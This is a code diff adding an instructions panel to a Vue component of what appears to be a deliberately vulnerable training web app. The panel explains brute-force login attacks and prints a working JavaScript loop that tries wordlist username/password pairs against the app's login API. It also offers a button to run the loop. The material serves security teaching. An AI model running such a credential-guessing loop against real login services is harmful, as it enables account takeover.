@@ -69,6 +69,49 @@ const toggleInstructions = () => {
         </ol>
       </div>
   </div>
+  <div v-else-if="vulnerabilityStore.getBruteForceVulnerable()" class="instructions">
+    <button @click="toggleInstructions" class="toggle-button">
+        {{ showInstructions ? "Hide Instructions" : "Instructions" }}
+      </button>
+      <div v-if="showInstructions" class="instructions-content">
+        <h3>Brute Force Attack Examples</h3>
+        <p>
+          In order to try a large number of common user name and password combinations, an attacker could run a script like the following:
+
+        </p>
+        <pre>
+          <code>
+            const usernames = await loadWordlist('/common_usernames.txt');
+            const passwords = await loadWordlist('/common_pws.txt');
+            let attempts = 0;
+
+            for (const user of usernames) {
+                for (const pass of passwords) {
+                    attempts++;
+
+                    const res = await fetch('/api/auth/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ user_name: user, password: pass })
+                    });
+
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.access_token) {
+                            console.log(`Success! Username: ${user}, Password: ${pass}`);
+                            console.log(`Total Attempts: ${attempts}`);
+                            return;
+                        }
+                    }
+                }
+            }
+          </code>
+        </pre>
+        <p>
+          In fact, we have implemented this script for you. You can run it from your browser by hitting the button below. Warning: this might take a couple of minutes.
+        </p>
+      </div>
+  </div>
 </template>
 
 
